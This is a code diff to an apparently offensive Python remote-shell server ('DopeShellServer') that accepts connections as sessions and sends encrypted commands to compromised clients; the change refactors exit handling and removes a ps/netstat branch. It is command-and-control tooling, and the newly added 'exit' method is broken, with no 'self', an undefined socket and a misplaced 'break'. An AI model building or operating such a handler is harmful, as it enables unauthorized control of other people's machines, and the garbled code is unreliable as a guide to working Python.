@@ -68,6 +68,10 @@ class DopeShellServer:
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
         return decrypted_data
+    def exit(command):
+        client_socket.send(self.encrypt(command.encode('utf-8')))
+            break
+
 
     def handle_client(self, session_id, client_socket):
         while True:
@@ -76,8 +80,7 @@ class DopeShellServer:
             command = input(f"Session {session_id} Shell> ")
             
             if command.lower() == 'exit':
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                break
+                exit(command)
 
             if command.lower().startswith('help'):
                 parts = command.split(maxsplit=1)
@@ -120,11 +123,6 @@ class DopeShellServer:
                 print(self.decrypt(response).decode('utf-8'))
 
 
-            elif command.lower() in ['ps', 'netstat']:
-                client_socket.send(self.encrypt(command.encode('utf-8')))
-                response = self.receive_data(client_socket)
-                print(response.decode('utf-8'))
-            
             elif command.lower() == 'sessions':
                 self.list_sessions()
 
@@ -151,7 +149,7 @@ class DopeShellServer:
 
     def run(self):
         print(f"[*] Listening on {self.host}:{self.port}")
-        while True: 
+        while True:
             client_socket, addr = self.sock.accept()
             session_id = self.session_counter
             print(f"[*] Connection from {addr}, Session ID: {session_id}")
